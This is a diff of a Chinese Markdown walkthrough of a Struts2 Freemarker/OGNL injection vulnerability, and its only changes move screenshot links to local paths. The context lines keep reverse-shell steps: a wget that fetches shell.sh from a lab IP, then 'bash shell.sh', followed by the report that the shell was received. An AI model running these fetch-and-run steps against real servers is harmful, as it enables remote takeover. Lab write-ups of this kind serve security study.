@@ -33,7 +33,7 @@ Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达�
 
 ```
 
-![image-20220302132454688](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021324760.png)
+![image-20220302132454688](./images/202203021324760.png)
 
 ### 反弹shell
 
@@ -52,7 +52,7 @@ wget 192.168.174.128/shell.sh
 
 上传shell.sh文件的Payload为：
 
-![image-20220302132524059](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021325134.png)
+![image-20220302132524059](./images/202203021325134.png)
 
 执行shell.sh文件的命令为：
 
@@ -62,8 +62,8 @@ bash shell.sh
 
 执行shell.sh文件的Payload为：
 
-![image-20220302132552428](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021325509.png)
+![image-20220302132552428](./images/202203021325509.png)
 
 成功接收反弹shell：
 
-![image-20220302132603933](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021326024.png)
+![image-20220302132603933](./images/202203021326024.png)
